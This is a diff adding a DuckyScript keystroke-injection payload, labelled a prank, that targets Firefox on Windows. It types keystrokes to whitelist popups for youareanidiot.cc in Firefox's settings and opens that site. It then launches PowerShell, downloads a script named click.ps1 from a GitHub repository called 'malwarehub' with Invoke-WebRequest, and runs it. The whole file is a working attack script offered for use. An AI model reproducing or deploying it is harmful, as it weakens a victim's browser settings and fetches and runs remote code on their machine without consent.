@@ -1,0 +1,76 @@
+REM Title: You Are An Idiot (Firefox)
+REM Author: Arithefirst
+REM Target:  Windows 10/11 (Firefox Only)
+REM Version: 1.0
+REM Category: Prank
+REM Opens youareanidiot.cc
+
+REM Open Firefox
+DELAY 1000
+GUI r 
+DELAY 500
+STRING firefox
+ENTER
+DELAY 1000
+
+REM White list youareanidiot popups
+STRING about:preferences
+ENTER
+DELAY 500
+F11
+STRING popup
+DELAY 500
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+STRING youareanidiot.cc
+TAB
+ENTER
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 1000
+
+REM go to youareanidiot
+CTRL L
+DELAY 1000
+STRING youareanidiot.cc
+DELAY 500
+ENTER
+DELAY 2000
+
+REM Click to unmute (Powershell)
+GUI r
+DELAY 500
+STRING Powershell
+ENTER
+DELAY 500
+STRING $url = "https://raw.githubusercontent.com/AriTheFirst/malwarehub/main/click.ps1"
+ENTER
+STRING $output = "c.ps1"
+ENTER
+STRING Invoke-WebRequest -Uri $url -OutFile $output
+ENTER
+DELAY 1000
+STRING .\c.ps1
+ENTER
+DELAY 500
